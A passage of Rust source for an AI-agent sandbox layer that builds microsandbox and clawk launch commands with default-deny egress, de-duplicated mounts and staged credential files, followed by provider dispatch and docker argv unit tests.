        // `msb` enforces net policy in-guest (own-kernel), so unlike docker we hand
        // it hostnames/CIDRs rather than pre-resolved IPs.
        if self.egress.is_empty() && !broker_active {
            args.push("--net-default".to_owned());
            args.push("deny".to_owned());
        } else {
            args.push("--net-default-egress".to_owned());
            args.push("deny".to_owned());
            for host in &self.egress {
                args.push("--net-rule".to_owned());
                // msb net-rule token grammar: `<action>[:<direction>]@<target>`
                // (confirmed against msb 0.6.8; e.g. `allow@example.com`).
                args.push(format!("allow@{host}"));
            }
            if broker_active {
                // `host` is msb's reserved group for the host machine (the local
                // trusted orchestrator running the broker), NOT an exfil path.
                args.push("--net-rule".to_owned());
                args.push("allow@host".to_owned());
            }
        }

        // Project root always mounted ONCE at its absolute path, READ-WRITE and
        // host-visible: the resident merges worker branches in-box, so its in-guest
        // writes must land on the host to be committable. `msb --mount-dir
        // SOURCE:DEST[:ro|:rw]` binds a host directory into the guest (confirmed
        // against msb 0.6.8). NB: msb 0.6.8 has NO `--project` flag (the workdir is
        // set via `--workdir` below), so the project is a plain rw bind — never a
        // second `--project`-style mount of the same guest path.
        let project_target = PathBuf::from(&proj);
        args.push("--mount-dir".to_owned());
        args.push(format!("{proj}:{proj}:rw"));
        // Effective extra mounts = union(sandbox, route), de-duplicated by the
        // expanded absolute target; first declaration wins. The project mount is
        // PRE-REGISTERED so an explicit `mounts` / `--add-dir` entry resolving to
        // the SAME guest path — e.g. the resident gate's `{workspace}:{workspace}:rw`,
        // where project == workspace — collapses onto the single rw project bind
        // rather than emitting a duplicate guest path (msb rejects "multiple volumes
        // cannot mount the same guest path: <workspace>"). Read-only unless the spec
        // says otherwise (msb appends `:ro`/`:rw` like docker).
        let mut seen_targets: std::collections::HashSet<PathBuf> = std::collections::HashSet::new();
        seen_targets.insert(project_target.clone());
        // msb (unlike docker) refuses to mount the SAME SOURCE at more than one
        // guest path ("multiple volumes cannot mount the same guest path"). The
        // project is already bound rw at its host path, so an explicit mount of the
        // same source — e.g. the resident gate's required `{workspace}:/workspace:rw`
        // where project == workspace — is REDUNDANT and must be skipped (dedup by
        // source, in addition to target). The single rw project bind serves it.
        let mut seen_sources: std::collections::HashSet<PathBuf> =
            std::collections::HashSet::new();
        seen_sources.insert(project_target);
        for (_origin, raw) in &self.mounts {
            let mspec = parse_mount(raw)
                .with_context(|| format!("invalid mount '{raw}' for sandbox '{}'", self.image))?;
            let source = expand_mount_path(&mspec.source, &self.project_root);
            let target = expand_mount_path(&mspec.target, &self.project_root);
            if !seen_targets.insert(target.clone()) || !seen_sources.insert(source.clone()) {
                continue;
            }
            let source = source.display().to_string();
            let target = target.display().to_string();
            args.push("--mount-dir".to_owned());
            if mspec.writable {
                args.push(format!("{source}:{target}:rw"));
            } else {
                args.push(format!("{source}:{target}:ro"));
            }
        }
        // M11 channel 3 — curated identity FILES, read-only, credential-denylisted.
        // NB: `msb --mount-dir` is directory-granularity; a file-level bind is
        // best-effort (documented in the README). The validation still refuses a
        // whole dotdir / credential file, so we never widen the exposure.
        for raw in &self.identity.identity_context {
            let ispec = parse_mount(raw).with_context(|| {
                format!(
                    "invalid identity_context mount '{raw}' for sandbox '{}'",
                    self.image
                )
            })?;
            let source = expand_mount_path(&ispec.source, &self.project_root);
            let target = expand_mount_path(&ispec.target, &self.project_root);
            // identity_context is the sanctioned curated-file escape hatch inside an
            // otherwise-denylisted dir: keep the M8 control-plane/socket floor but not
            // the blanket credential-DIR denylist; `check_identity_context_mount`
            // rejects credential FILES, dirs, and writable mounts.
            check_control_plane_denylist(&source)?;
            check_identity_context_mount(&source, ispec.writable)?;
            if !seen_targets.insert(target.clone()) {
                continue;
            }
            let source = source.display().to_string();
            let target = target.display().to_string();
            args.push("--mount-dir".to_owned());
            args.push(format!("{source}:{target}:ro"));
        }
        // M11 channel 2 — forward the host SSH agent socket (best-effort in a
        // microVM; see README) so `git push` signs on the host, keys never enter.
        if let Some(sock) = &self.identity.ssh_auth_sock {
            args.push("--mount-dir".to_owned());
            args.push(format!("{sock}:{SSH_AGENT_GUEST_SOCK}:ro"));
        }

        args.push("--workdir".to_owned());
        args.push(cwd);
        // Clean base env in the guest; force HOME to the guest session store so
        // the agent writes its resume state there. M11 channels 1 & 2 fold in via
        // `guest_env()`. Sorted for a deterministic argv.
        let mut env = spec.env;
        env.extend(self.identity.guest_env());
        // Credential targets are loaded from CREDENTIAL_ENV_FILE in-guest below.
        // Remove them after the merge so a colliding spec env cannot leak either.
        for key in self.identity.auth_env.keys() {
            env.remove(key);
        }
        env.insert("HOME".to_owned(), self.home.clone());
        for (key, value) in &env {
            args.push("--env".to_owned());
            args.push(format!("{key}={value}"));
        }

        // Opt-in ceilings, translated from the shared docker-grammar config keys
        // onto `msb run`'s own `--memory` (MB integer) / `--cpus` (integer core
        // count) flags. Absent ⇒ unbounded, unchanged argv. A value that fails to
        // parse against docker's grammar is dropped with a warning rather than
        // failing the run — msb DOES support ceilings, so this is a parse issue,
        // not an unsupported-primitive one.
        if let Some(memory) = &self.memory {
            match docker_memory_to_msb_mb(memory) {
                Some(mb) => {
                    args.push("--memory".to_owned());
                    args.push(mb.to_string());
                }
                None => eprintln!(
                    "sandbox: memory limit '{memory}' is not valid docker `--memory` grammar; \
                     ignoring it for the microsandbox primitive"
                ),
            }
        }
        if let Some(cpus) = &self.cpus {
            match docker_cpus_to_msb_count(cpus) {
                Some(count) => {
                    args.push("--cpus".to_owned());
                    args.push(count.to_string());
                }
                None => eprintln!(
                    "sandbox: cpu limit '{cpus}' is not valid docker `--cpus` grammar; \
                     ignoring it for the microsandbox primitive"
                ),
            }
        }

        // Image is positional, then the command after `--` so its flags are not
        // parsed by `msb`.
        args.push(self.image.clone());
        args.push("--".to_owned());
        // msb does not forward host stdin into the guest, so a batch agent that
        // reads its prompt from stdin (`claude -p`) would hang. When the prompt
        // was staged as a guest file (`VARDA_PROMPT_FILE` present, batch mode),
        // redirect that file into the agent's stdin IN-GUEST. The
        // `sh -c 'exec "$0" "$@" < "$F"' program args...` form preserves the
        // program + args verbatim (no re-quoting) and `exec` keeps the agent as
        // the process msb waits on. Interactive mode already reads the file via
        // its own `sh -c '<agent> "$(cat $VARDA_PROMPT_FILE)"'`, so it is untouched.
        if !self.identity.auth_env.is_empty() {
            args.push("sh".to_owned());
            args.push("-c".to_owned());
            let redirect =
                if matches!(mode, LaunchMode::Batch) && env.contains_key("VARDA_PROMPT_FILE") {
                    " < \"$VARDA_PROMPT_FILE\""
                } else {
                    ""
                };
            args.push(format!(
                ". {} && exec \"$0\" \"$@\"{redirect}",
                Self::CREDENTIAL_ENV_FILE
            ));
        } else if matches!(mode, LaunchMode::Batch) && env.contains_key("VARDA_PROMPT_FILE") {
            args.push("sh".to_owned());
            args.push("-c".to_owned());
            args.push(r#"exec "$0" "$@" < "$VARDA_PROMPT_FILE""#.to_owned());
        }
        args.push(spec.program);
        args.extend(spec.args);

        Ok(CommandSpec {
            program: "msb".to_owned(),
            args,
            // The `msb` CLI inherits the host env (PATH etc.); the guest env is
            // fully specified by the `--env` flags above.
            env: BTreeMap::new(),
            cwd: None,
        })
    }

    fn stage_file(&self, content: &str, guest_path: &str) -> Result<String> {
        self.record_staged(content, guest_path, false)
    }

    fn stage_credential_file(&self, content: &str, guest_path: &str) -> Result<String> {
        // File-target credential: same pre-boot `--copy-file` machinery as the
        // prompt, but the host temp is written read-only (0o400) so the value is
        // not left mutable and lands read-only in-guest after the copy.
        self.record_staged(content, guest_path, true)
    }

    fn identity_files(&self) -> BTreeMap<String, String> {
        self.identity.auth_files.clone()
    }

    fn session_store_root(&self) -> Option<PathBuf> {
        // `msb cp <sandbox>:<home> <session_store>` lands the guest HOME as a
        // SUBDIRECTORY named after HOME's basename — msb has no docker-style `/.`
        // contents-copy (confirmed: it rejects a `.` path component). So the
        // agent's `.claude/…` ends up at `<session_store>/<basename>/.claude/…`
        // and discovery must read that nested dir.
        let root = Path::new(&self.home)
            .file_name()
            .map(|name| self.session_store.join(name))
            .unwrap_or_else(|| self.session_store.clone());
        Some(root)
    }

    fn store_is_live(&self) -> bool {
        // Guest HOME lives in VM storage during the run; it only reaches the host
        // after `extract_session_store`, so discovery must run post-exit.
        false
    }

    fn prompt_via_file(&self) -> bool {
        // `msb run` does not forward host stdin into the guest (verified: a piped
        // `msb run … -- cat` reads nothing), so a batch `claude -p` reading stdin
        // hangs. Deliver the prompt as a staged guest file + in-guest redirect.
        true
    }

    fn validate_mounts(&self) -> Result<()> {
        // Fail loudly when a bind SOURCE is absent on the host — same rationale
        // as docker: a missing source would otherwise mount an empty guest stub.
        if !self.project_root.exists() {
            bail!(
                "sandbox project mount source '{}' does not exist on the host (check the path / VM share)",
                self.project_root.display()
            );
        }
        for (origin, raw) in &self.mounts {
            let mspec = parse_mount(raw)
                .with_context(|| format!("invalid mount '{raw}' for sandbox '{}'", self.image))?;
            let source = expand_mount_path(&mspec.source, &self.project_root);
            // Credential/identity-store denylist applies to the FULL merged set
            // (ALL origins, trusted central config included) at launch time.
            check_credential_denylist(&source)?;
            if !source.exists() {
                bail!(
                    "sandbox {origin:?} mount source '{}' does not exist on the host (check the path / VM share)",
                    source.display()
                );
            }
        }
        for raw in &self.identity.identity_context {
            let ispec = parse_mount(raw).with_context(|| {
                format!(
                    "invalid identity_context mount '{raw}' for sandbox '{}'",
                    self.image
                )
            })?;
            let source = expand_mount_path(&ispec.source, &self.project_root);
            check_control_plane_denylist(&source)?;
            check_identity_context_mount(&source, ispec.writable)?;
        }
        Ok(())
    }

    async fn extract_session_store(&self) -> Result<()> {
        // Copy the guest HOME dir into the host session-store dir. Runs after the
        // agent exits and before teardown, so resume-capture can read it back from
        // the host even though the guest HOME was never bind-mounted. NB: msb has
        // no docker `/.` contents-copy, so this nests the HOME under its basename;
        // `session_store_root()` accounts for that.
        let src = format!("{}:{}", self.sandbox, self.home);
        let dst = self.session_store.display().to_string();
        let output = tokio::process::Command::new("msb")
            .args(["cp", &src, &dst])
            .output()
            .await
            .with_context(|| format!("failed to spawn `msb cp` from sandbox '{}'", self.sandbox))?;
        if !output.status.success() {
            bail!(
                "`msb cp {src} {dst}` failed with status {}; stderr: {}",
                output.status,
                String::from_utf8_lossy(&output.stderr).trim()
            );
        }
        Ok(())
    }

    async fn guest_relay_connected(&self) -> Option<bool> {
        let logs = tokio::process::Command::new("msb")
            .args(["logs", "--source", "system", &self.sandbox])
            .output()
            .await
            .ok()?;
        if !logs.status.success() {
            return None;
        }
        let log = String::from_utf8_lossy(&logs.stdout);
        if log.contains("agent relay: client connected") {
            return Some(true);
        }
        if !log.contains("entering VM") {
            return None;
        }
        let listing = tokio::process::Command::new("msb")
            .arg("ls")
            .output()
            .await
            .ok()?;
        if !listing.status.success() {
            return None;
        }
        let state = String::from_utf8_lossy(&listing.stdout)
            .lines()
            .find(|line| line.split_whitespace().next() == Some(self.sandbox.as_str()))
            .and_then(|line| line.split_whitespace().nth(2))
            .map(str::to_owned);
        state
            .as_deref()
            .filter(|state| matches!(*state, "stopped" | "crashed" | "failed" | "exited"))
            .map(|_| false)
    }

    async fn teardown(self: Box<Self>) -> Result<()> {
        // Remove the host temps staged for `--copy-file` (msb copies them into the
        // guest but leaves the host originals) so no credential value is left
        // behind; the guest copies vanish with the sandbox `rm` below.
        for (host_temp, _) in std::mem::take(
            &mut *self
                .staged_files
                .lock()
                .expect("staged_files mutex poisoned"),
        ) {
            let _ = std::fs::remove_file(&host_temp);
        }
        // Best-effort: stop then remove the per-session sandbox; a cleanup
        // failure must not fail the run.
        let _ = tokio::process::Command::new("msb")
            .args(["stop", &self.sandbox])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .await;
        let _ = tokio::process::Command::new("msb")
            .args(["rm", "-f", &self.sandbox])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .await;
        Ok(())
    }
}

pub struct ClawkSession {
    image: Option<String>,
    project_root: PathBuf,
    mounts: Vec<(MountOrigin, String)>,
    /// Egress allow-list applied before launch through `clawk network allow`.
    egress: Vec<String>,
    /// Host dir the guest HOME is copied into after the run. clawk's session
    /// store is not assumed live on the host, so resume discovery runs post-exit.
    session_store: PathBuf,
    sandbox: String,
    home: String,
    identity: SandboxIdentity,
    staged_files: std::sync::Mutex<Vec<(PathBuf, String)>>,
}

impl ClawkSession {
    fn record_staged(&self, content: &str, guest_path: &str, read_only: bool) -> Result<String> {
        let tmp = write_stage_temp(content, read_only)?;
        self.staged_files
            .lock()
            .expect("staged_files mutex poisoned")
            .push((tmp, guest_path.to_owned()));
        Ok(guest_path.to_owned())
    }

    async fn apply_network_allowlist(&self) -> Result<()> {
        for host in &self.egress {
            let output = tokio::process::Command::new("clawk")
                .args(["network", "allow", &self.sandbox, host])
                .output()
                .await
                .with_context(|| {
                    format!(
                        "failed to spawn `clawk network allow {}` for sandbox '{}'",
                        host, self.sandbox
                    )
                })?;
            if !output.status.success() {
                bail!(
                    "`clawk network allow {} {host}` failed with status {}; stderr: {}",
                    self.sandbox,
                    output.status,
                    String::from_utf8_lossy(&output.stderr).trim()
                );
            }
        }
        Ok(())
    }
}

#[async_trait]
impl SandboxSession for ClawkSession {
    fn wrap(&self, spec: CommandSpec, mode: LaunchMode) -> Result<CommandSpec> {
        ensure_worktree_gitdir_visible(&self.project_root, &self.mounts)?;
        let proj = self.project_root.display().to_string();
        let cwd = spec
            .cwd
            .as_ref()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|| proj.clone());

        // Centralized clawk CLI shape. Normal tests assert this construction; live
        // tests are ignored because this repository must not require clawk locally.
        let mut args = vec![
            "run".to_owned(),
            "--name".to_owned(),
            self.sandbox.clone(),
            "--project".to_owned(),
            proj.clone(),
            "--home".to_owned(),
            self.home.clone(),
        ];
        if matches!(mode, LaunchMode::Interactive) {
            args.push("--tty".to_owned());
        }
        if let Some(image) = &self.image {
            args.push("--image".to_owned());
            args.push(image.clone());
        }
        if self.egress.is_empty() {
            args.push("--network".to_owned());
            args.push("none".to_owned());
        } else {
            args.push("--network".to_owned());
            args.push("default-deny".to_owned());
        }

        args.push("--mount".to_owned());
        args.push(format!("{proj}:{proj}:rw"));
        let mut seen_targets: std::collections::HashSet<PathBuf> = std::collections::HashSet::new();
        for (_origin, raw) in &self.mounts {
            let cspec = parse_mount(raw).with_context(|| {
                format!("invalid mount '{raw}' for clawk sandbox '{}'", self.sandbox)
            })?;
            let source = expand_mount_path(&cspec.source, &self.project_root);
            let target = expand_mount_path(&cspec.target, &self.project_root);
            check_credential_denylist(&source)?;
            if source.is_file() {
                bail!(
                    "clawk sandbox '{}' does not support file bind mount '{}'; mount a directory or stage a file credential instead",
                    self.sandbox,
                    source.display()
                );
            }
            if !seen_targets.insert(target.clone()) {
                continue;
            }
            args.push("--mount".to_owned());
            args.push(format!(
                "{}:{}:{}",
                source.display(),
                target.display(),
                if cspec.writable { "rw" } else { "ro" }
            ));
        }

        for raw in &self.identity.identity_context {
            let ispec = parse_mount(raw).with_context(|| {
                format!(
                    "invalid identity_context mount '{raw}' for clawk sandbox '{}'",
                    self.sandbox
                )
            })?;
            let source = expand_mount_path(&ispec.source, &self.project_root);
            let target = expand_mount_path(&ispec.target, &self.project_root);
            check_control_plane_denylist(&source)?;
            check_identity_context_mount(&source, ispec.writable)?;
            if !seen_targets.insert(target.clone()) {
                continue;
            }
            args.push("--mount-file".to_owned());
            args.push(format!("{}:{}:ro", source.display(), target.display()));
        }

        if let Some(sock) = &self.identity.ssh_auth_sock {
            args.push("--mount-file".to_owned());
            args.push(format!("{sock}:{SSH_AGENT_GUEST_SOCK}:ro"));
        }
        {
            let staged = self
                .staged_files
                .lock()
                .expect("staged_files mutex poisoned");
            for (host_temp, guest_path) in staged.iter() {
                args.push("--copy-file".to_owned());
                args.push(format!("{}:{guest_path}", host_temp.display()));
            }
        }
        args.push("--workdir".to_owned());
        args.push(cwd);

        let mut env = spec.env;
        env.extend(self.identity.guest_env());
        env.insert("HOME".to_owned(), self.home.clone());
        for (key, value) in &env {
            args.push("--env".to_owned());
            args.push(format!("{key}={value}"));
        }
        args.push("--".to_owned());
        args.push(spec.program);
        args.extend(spec.args);

        Ok(CommandSpec {
            program: "clawk".to_owned(),
            args,
            env: BTreeMap::new(),
            cwd: None,
        })
    }

    fn stage_file(&self, content: &str, guest_path: &str) -> Result<String> {
        self.record_staged(content, guest_path, false)
    }

    fn stage_credential_file(&self, content: &str, guest_path: &str) -> Result<String> {
        self.record_staged(content, guest_path, true)
    }

    fn identity_files(&self) -> BTreeMap<String, String> {
        self.identity.auth_files.clone()
    }

    async fn begin_batch(&self, wrapped: CommandSpec) -> Result<CommandSpec> {
        self.apply_network_allowlist().await?;
        Ok(wrapped)
    }

    async fn begin_interactive(&self, wrapped: CommandSpec) -> Result<CommandSpec> {
        self.apply_network_allowlist().await?;
        Ok(wrapped)
    }

    fn session_store_root(&self) -> Option<PathBuf> {
        Some(self.session_store.clone())
    }

    fn store_is_live(&self) -> bool {
        false
    }

    fn validate_mounts(&self) -> Result<()> {
        if !self.project_root.exists() {
            bail!(
                "sandbox project mount source '{}' does not exist on the host (check the path / VM share)",
                self.project_root.display()
            );
        }
        for (origin, raw) in &self.mounts {
            let cspec = parse_mount(raw).with_context(|| {
                format!("invalid mount '{raw}' for clawk sandbox '{}'", self.sandbox)
            })?;
            let source = expand_mount_path(&cspec.source, &self.project_root);
            check_credential_denylist(&source)?;
            if !source.exists() {
                bail!(
                    "sandbox {origin:?} mount source '{}' does not exist on the host (check the path / VM share)",
                    source.display()
                );
            }
            if source.is_file() {
                bail!(
                    "clawk sandbox '{}' does not support file bind mount '{}'; mount a directory or stage a file credential instead",
                    self.sandbox,
                    source.display()
                );
            }
        }
        for raw in &self.identity.identity_context {
            let ispec = parse_mount(raw).with_context(|| {
                format!(
                    "invalid identity_context mount '{raw}' for clawk sandbox '{}'",
                    self.sandbox
                )
            })?;
            let source = expand_mount_path(&ispec.source, &self.project_root);
            check_control_plane_denylist(&source)?;
            check_identity_context_mount(&source, ispec.writable)?;
        }
        Ok(())
    }

    async fn extract_session_store(&self) -> Result<()> {
        let src = format!("{}:{}", self.sandbox, self.home);
        let dst = self.session_store.display().to_string();
        let output = tokio::process::Command::new("clawk")
            .args(["cp", &src, &dst])
            .output()
            .await
            .with_context(|| {
                format!("failed to spawn `clawk cp` from sandbox '{}'", self.sandbox)
            })?;
        if !output.status.success() {
            bail!(
                "`clawk cp {src} {dst}` failed with status {}; stderr: {}",
                output.status,
                String::from_utf8_lossy(&output.stderr).trim()
            );
        }
        Ok(())
    }

    async fn teardown(self: Box<Self>) -> Result<()> {
        for (host_temp, _) in std::mem::take(
            &mut *self
                .staged_files
                .lock()
                .expect("staged_files mutex poisoned"),
        ) {
            let _ = std::fs::remove_file(&host_temp);
        }
        let _ = tokio::process::Command::new("clawk")
            .args(["destroy", &self.sandbox])
            .stdout(std::process::Stdio::null())
            .stderr(std::process::Stdio::null())
            .status()
            .await;
        Ok(())
    }
}

/// Resolve the effective provider for a sandbox name against the config.
///
/// Dispatch is driven by the resolved [`SandboxConfig::primitive`] (the "what
/// kind of boundary" knob), which is orthogonal to the image/rootfs ("what
/// tools are installed"):
/// - `"local"` → [`LocalProvider`] (no isolation)
/// - `"docker"` → [`DockerProvider`] (shared-kernel container)
/// - `"microsandbox"` → [`MicrosandboxProvider`] (own-kernel microVM via `msb`)
/// - `"clawk"` → [`ClawkProvider`] (own-kernel microVM via `clawk`)
///
/// The bare name `"local"` with no `[sandboxes.local]` entry stays a shortcut
/// for the identity provider; any other name must have a `[sandboxes.<name>]`
/// entry (whose `primitive` defaults to `"docker"`).
pub fn provider_for(
    name: &str,
    sandboxes: &BTreeMap<String, SandboxConfig>,
    route_mounts: &[String],
    identity: &SandboxIdentity,
) -> Result<std::sync::Arc<dyn SandboxProvider>> {
    match sandboxes.get(name) {
        Some(config) => {
            // By-name lookup: only the image-intrinsic (`Sandbox`) and
            // project-context (`Route`) origins apply — an untrusted `.varda`
            // has no central name, so it never reaches this path.
            let mounts = merge_mount_origins(&config.mounts, route_mounts, &[]);
            provider_from_config(name, config, mounts, identity)
        }
        None if name == "local" => Ok(std::sync::Arc::new(LocalProvider)),
        None => bail!("sandbox '{name}' is not defined under [sandboxes]"),
    }
}

/// Build a provider directly from a [`SandboxConfig`] and a pre-merged,
/// origin-tagged mount set, dispatching on `config.primitive`. This is the
/// by-config constructor used by the live `.varda` run path (an inline `.varda`
/// sandbox has no central name, so it cannot go through [`provider_for`]); the
/// caller composes the three mount origins with [`merge_mount_origins`].
pub fn provider_from_config(
    name: &str,
    config: &SandboxConfig,
    mounts: Vec<(MountOrigin, String)>,
    identity: &SandboxIdentity,
) -> Result<std::sync::Arc<dyn SandboxProvider>> {
    if !config.egress.is_empty() && config.primitive == "local" {
        bail!(
            "sandbox '{name}' declares non-empty `egress` with primitive `local`, but local launches have no \
             network isolation and cannot enforce DNS-pin or strict egress. Use an isolating primitive or set \
             `egress = []`."
        );
    }
    if !config.egress.is_empty()
        && config.egress_mode != EgressMode::DnsPin
        && !egress_is_enforced(&config.primitive, config.egress_mode)
    {
        bail!(
            "sandbox '{name}' declares non-empty `egress` in `{:?}` mode, but primitive '{}' cannot \
             enforce egress. Docker enforces strict/proxy egress via an allow-listing forward-proxy \
             sidecar; `microsandbox`/`clawk` firewall natively. Set `egress_mode = \"dns-pin\"` for the \
             legacy docker name-pin, or set `egress = []` for offline.",
            config.egress_mode,
            config.primitive
        );
    }
    match config.primitive.as_str() {
        // `local` is the identity provider (no isolation); the M11 identity/auth
        // channels are a sandbox-boundary concern, so nothing to inject here.
        "local" => Ok(std::sync::Arc::new(LocalProvider)),
        "docker" => Ok(std::sync::Arc::new(
            DockerProvider::from_config(name, config, mounts)?.with_identity(identity.clone()),
        )),
        "microsandbox" => Ok(std::sync::Arc::new(
            MicrosandboxProvider::from_config(name, config, mounts)?
                .with_identity(identity.clone()),
        )),
        "clawk" => Ok(std::sync::Arc::new(
            ClawkProvider::from_config(name, config, mounts)?.with_identity(identity.clone()),
        )),
        other => bail!(
            "sandbox '{name}' has unknown primitive '{other}' (expected local, docker, microsandbox, or clawk)"
        ),
    }
}

#[cfg(test)]
impl DockerSession {
    /// Construct a session directly for wrap/argv/mount unit tests, bypassing
    /// `prepare()` (which would need a live docker daemon). The volume/container
    /// names and HOME are fixed so argv assertions stay deterministic.
    fn for_test(
        image: &str,
        project_root: &str,
        mounts: Vec<(MountOrigin, String)>,
        egress_pins: Vec<(String, String)>,
        session_store: &str,
    ) -> Self {
        Self {
            image: image.to_owned(),
            project_root: PathBuf::from(project_root),
            mounts,
            egress_pins,
            egress_hosts: Vec::new(),
            session_store: PathBuf::from(session_store),
            volume: "varda-sbx-s1".to_owned(),
            container: "varda-sbx-s1".to_owned(),
            home: "/home/agent".to_owned(),
            memory: None,
            cpus: None,
            identity: SandboxIdentity::default(),
            staged_files: std::sync::Mutex::new(Vec::new()),
        }
    }

    /// Same as [`for_test`](Self::for_test) but with an M11 identity bundle attached,
    /// for asserting the identity/auth channels land in the docker argv.
    fn for_test_with_identity(
        image: &str,
        project_root: &str,
        session_store: &str,
        identity: SandboxIdentity,
    ) -> Self {
        Self {
            identity,
            ..Self::for_test(image, project_root, vec![], vec![], session_store)
        }
    }
}

#[cfg(test)]
mod tests {

    /// A staged credential is guest-readable by design (the in-box agent is neither
    /// root nor the host uid, and `--copy-file` preserves the source mode). Its
    /// privacy on the HOST therefore comes from the containing directory, which must
    /// be `0o700` — no other local user can traverse in. Assert the property that
    /// actually protects the secret, not a proxy for it.
    fn assert_credential_dir_is_private(host_temp: &std::path::Path) {
        use std::os::unix::fs::PermissionsExt as _;
        let dir = host_temp.parent().expect("staged credential has a parent dir");
        let mode = std::fs::metadata(dir).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode, 0o700,
            "credential stage dir {} must be private, got {mode:o}",
            dir.display()
        );
    }
    use super::*;
    use std::path::Path;

    fn empty_spec() -> CommandSpec {
        CommandSpec {
            program: "agent".to_owned(),
            args: Vec::new(),
            env: BTreeMap::new(),
            cwd: None,
        }
    }

    #[test]
    fn mark_sandboxed_sets_the_marker_for_every_non_local_provider() {
        for provider_name in ["docker", "microsandbox", "clawk"] {
            let mut spec = empty_spec();
            mark_sandboxed(&mut spec, provider_name);
            assert_eq!(
                spec.env.get(SANDBOXED_MARKER_ENV).map(String::as_str),
                Some("1"),
                "provider '{provider_name}' must get the sandbox marker regardless of \
                 LaunchMode (mark_sandboxed itself has no mode input — callers apply it \
                 identically for Batch and Interactive)"
            );
        }
    }

    #[test]
    fn mark_sandboxed_leaves_local_unmarked() {
        let mut spec = empty_spec();
        mark_sandboxed(&mut spec, "local");
        assert!(
            !spec.env.contains_key(SANDBOXED_MARKER_ENV),
            "local crosses no sandbox boundary and must never get the marker"
        );
    }

    fn ctx<'a>(project_root: &'a Path) -> SandboxContext<'a> {
        ctx_with_id(project_root, "session-1")
    }

    /// Like [`ctx`] but with an explicit session id. Docker integration tests
    /// that actually launch a container must each use a UNIQUE id: `prepare`
    /// derives the container/volume name (`varda-sbx-<id>`) from it, and the
    /// docker path drops `--rm` (the container must outlive its process so the
    /// session store can be `docker cp`-ed out), so a shared id collides.
    fn ctx_with_id<'a>(project_root: &'a Path, session_id: &'a str) -> SandboxContext<'a> {
        SandboxContext {
            project_root,
            route_glob: "**",
            agent_kind: AgentKind::Acp,
            session_id,
        }
    }

    /// Best-effort removal of a `varda-sbx-<id>` container + its volume, so a
    /// test is robust to a leftover from a prior panicked run (teardown skipped).
    async fn docker_cleanup(session_id: &str) {
        let name = format!("varda-sbx-{}", sanitize_docker_name(session_id));
        let quiet = |mut c: tokio::process::Command| async move {
            let _ = c
                .stdout(std::process::Stdio::null())
                .stderr(std::process::Stdio::null())
                .status()
                .await;
        };
        let mut rm = tokio::process::Command::new("docker");
        rm.args(["rm", "-f", &name]);
        quiet(rm).await;
        let mut vol = tokio::process::Command::new("docker");
        vol.args(["volume", "rm", "-f", &name]);
        quiet(vol).await;
    }

    #[tokio::test]
    async fn local_wrap_is_identity() {
        let provider = LocalProvider;
        let root = Path::new("/proj");
        let session = provider.prepare(&ctx(root)).await.unwrap();
        let mut env = BTreeMap::new();
        env.insert("A".to_owned(), "1".to_owned());
        let spec = CommandSpec {
            program: "claude".to_owned(),
            args: vec!["--foo".to_owned()],
            env: env.clone(),
            cwd: Some(PathBuf::from("/proj")),
        };
        let wrapped = session.wrap(spec.clone(), LaunchMode::Batch).unwrap();
        assert_eq!(wrapped, spec);
    }

    #[tokio::test]
    async fn docker_wrap_produces_exact_argv() {
        let provider = DockerProvider::new_for_test("docker", "varda:latest", &[], &[]);
        let root = Path::new("/home/me/project");
        let session = provider.prepare(&ctx(root)).await.unwrap();

        let mut env = BTreeMap::new();
        env.insert("FOO".to_owned(), "bar".to_owned());
        env.insert("ALPHA".to_owned(), "beta".to_owned());
        let spec = CommandSpec {
            program: "claude".to_owned(),
            args: vec!["--print".to_owned(), "-".to_owned()],
            env,
            cwd: Some(PathBuf::from("/home/me/project")),
        };

        let wrapped = session.wrap(spec, LaunchMode::Batch).unwrap();
        // HOME is a per-session named volume mounted at a fixed in-container path;
        // its name derives from the (sanitized) session id "session-1".
        assert_eq!(wrapped.program, "docker");
        assert_eq!(
            wrapped.args,
            vec![
                "run",
                "--name",
                "varda-sbx-session-1",
                "--init",
                "-i",
                "--network",
                "none",
                "-v",
                "/home/me/project:/home/me/project",
                "-v",
                "varda-sbx-session-1:/home/agent",
                "-w",
                "/home/me/project",
                // sorted env: ALPHA before FOO before the injected HOME
                "-e",
                "ALPHA=beta",
                "-e",
                "FOO=bar",
                "-e",
                "HOME=/home/agent",
                "varda:latest",
                "claude",
                "--print",
                "-",
            ]
        );
        assert!(wrapped.env.is_empty());
        assert!(wrapped.cwd.is_none());
    }

    /// task-limits: an opt-in `memory`/`cpus` ceiling emits `--memory`,
    /// `--memory-swap` (equal to `--memory`, so docker does not silently grant
    /// swap equal to the limit again), and `--cpus`, positioned right before the
    /// image. Byte-identical otherwise to [`docker_wrap_produces_exact_argv`].
    #[test]
    fn docker_wrap_emits_memory_and_cpus_ceilings() {
        let session = DockerSession {
            memory: Some("4g".to_owned()),
            cpus: Some("2".to_owned()),
            ..DockerSession::for_test("img", "/proj", vec![], vec![], "/store")
        };
        let spec = CommandSpec {
            program: "claude".to_owned(),
            args: vec![],
            env: BTreeMap::new(),
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Batch).unwrap();
        assert_eq!(
            wrapped.args,
            vec![
                "run",
                "--name",
                "varda-sbx-s1",
                "--init",
                "-i",
                "--network",
                "none",
                "-v",
                "/proj:/proj",
                "-v",
                "varda-sbx-s1:/home/agent",
                "-w",
                "/proj",
                "-e",
                "HOME=/home/agent",
                "--memory",
                "4g",
                "--memory-swap",
                "4g",
                "--cpus",
                "2",
                "img",
                "claude",
            ]
        );
    }

    /// task-limits: omitting `memory`/`cpus` produces argv byte-identical to
    /// today's — no ceiling flags at all.
    #[test]
    fn docker_wrap_omits_ceiling_flags_when_unset() {
        let session = DockerSession::for_test("img", "/proj", vec![], vec![], "/store");
        let spec = CommandSpec {
            program: "claude".to_owned(),
            args: vec![],
            env: BTreeMap::new(),
            cwd: None,
        };
        let wrapped = session.wrap(spec, LaunchMode::Batch).unwrap();
        assert!(!wrapped.args.iter().any(|a| a == "--memory"
            || a == "--memory-swap"
            || a == "--cpus"));
    }

    #[tokio::test]
    async fn docker_wrap_defaults_cwd_to_project_root() {
        let provider = DockerProvider::new_for_test("docker", "img", &[], &[]);
        let root = Path::new("/srv/app");
        let session = provider.prepare(&ctx(root)).await.unwrap();
